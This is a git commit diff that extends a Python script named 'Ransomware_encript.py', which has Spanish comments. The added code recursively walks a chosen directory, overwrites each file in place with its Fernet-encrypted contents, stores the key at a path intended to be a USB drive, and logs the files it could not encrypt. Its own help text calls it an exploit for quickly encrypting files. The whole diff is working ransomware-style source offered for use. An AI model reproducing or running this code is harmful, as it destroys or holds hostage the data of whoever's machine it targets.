0deb1395da7ee42e7c884f5436b4ffc28628559e
K2sUCI <148832097+K2uci@users.noreply.github.com>
2024-01-03 07:22:12 -0500

    Update Ransomware_encript.py
    Finish

--- Ransomware_encript.py
+++ Ransomware_encript.py
@@ -1,31 +1,63 @@
 from cryptography.fernet import Fernet
+import argparse
 import os
 
-def generar_key():
+arg = None
+
+#Funcion para saber que archivos no se encriptaron por permisos admin
+def log_file(archivo_error):
+    if os.path.exists(str(args.key+'/log_error.txt')):
+        with open(str(args.key+'/log_error.txt'),'r+') as file:
+            file.seek(0,2)
+            file.write(str(archivo_error+'\n'))
+    else:
+        with open(str(args.key+'/log_error.txt'),'w') as file:
+            file.write(str(archivo_error+'\n'))
+
+#Funcion para encriptar archivo por archivo
+def encrypt(item,key):
+    f = Fernet(key)
+    try:
+        with open(item,'rb') as file:
+            file_data = file.read()
+        encrypt_data = f.encrypt(file_data)
+        with open(item,'wb') as file:
+            file.write(encrypt_data)
+    except PermissionError:
+         log_file(item)
+
+#Funcion para guardar la clave de encriptacion
+def generar_key(path):
 	key = Fernet.generate_key()
-	with open('key.key','wb') as key_file:
+	with open(path+'/key.key','wb') as key_file:
 		key_file.write(key)
 
-def cargar_key():
-	return open('key.key', 'rb').read()
+#Funcion para cargar la llave
+def cargar_key(path) -> str:
+	return open(path+'/key.key', 'rb').read()
 
-def encrypt(items,key):
-	f = Fernet(key)
-	for item in items:
-		with open(item,'rb') as file:
-			file_data = file.read()
-		encrypt_data = f.encrypt(file_data)
-		with open(item,'wb') as file:
-			file.write(encrypt_data)
-
-if __name__ == '__main__':
+#Muestra tods los archivos de una pc
+def mostrar_archivos(directorio):
+    lista_archivos = os.listdir(directorio)
+    for archivo in lista_archivos:      
+        #Si no existe un . en el archivo analizado asumo que es un carpeta y entro
+        if not '.' in archivo:
+            #Concateno el valor actual de lista de archivos con la sgte carpeta
+            lista_archivos = os.path.join(directorio,archivo)
+            if os.path.isdir(lista_archivos):
+                mostrar_archivos(lista_archivos)
+            #Si no es un directorio procedemos a encriptarlo
+        else:
+            encrypt(directorio+'/'+archivo, cargar_key(args.key))
 	
-	path = '/home/roos/test'
-	item = os.listdir(path)
-	full_path = [path+'/'+items for items in item]
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="Exploit para encriptar archivos de manera\
+    rapida, pruebame via USB y agrega la extencion")
+    parser.add_argument('-s',"--source" ,type=str ,help="Escoge el directorio a encriptar")
+    parser.add_argument('-k',"--key", type=str ,default=os.getcwd(), help="Escoge la direccion de la llave,default (USB)")
+    args = parser.parse_args()
+    generar_key(args.key)
+    mostrar_archivos(args.source)
 
-	generar_key()
-	key = cargar_key()
 
-	encrypt(full_path, key)	
  
